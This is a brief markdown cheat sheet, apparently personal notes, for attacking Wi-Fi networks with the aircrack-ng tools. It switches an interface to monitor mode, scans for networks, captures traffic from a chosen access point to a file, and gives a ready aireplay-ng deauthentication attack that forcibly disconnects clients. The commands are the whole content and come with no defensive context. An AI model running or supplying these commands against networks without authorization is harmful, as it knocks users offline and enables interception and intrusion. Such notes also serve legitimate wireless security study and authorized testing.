> ifconfig wlan0 down
> airmon-ng check kill
> iwconfig wlan0 mode monitor
> ifconfig wlan0 up


# HOST DISCOVERY

> List available networks: 
> `airodump-ng wlan0`
> 
> Targetted sniffing:
>  `airodump-ng --bssid <host-mac> --channel <channel> --write <file> wlan0`
>  
>  De-auth attack:
>  `aireplay-ng --deauth <packets> -a <host> -c <station> wlan0`


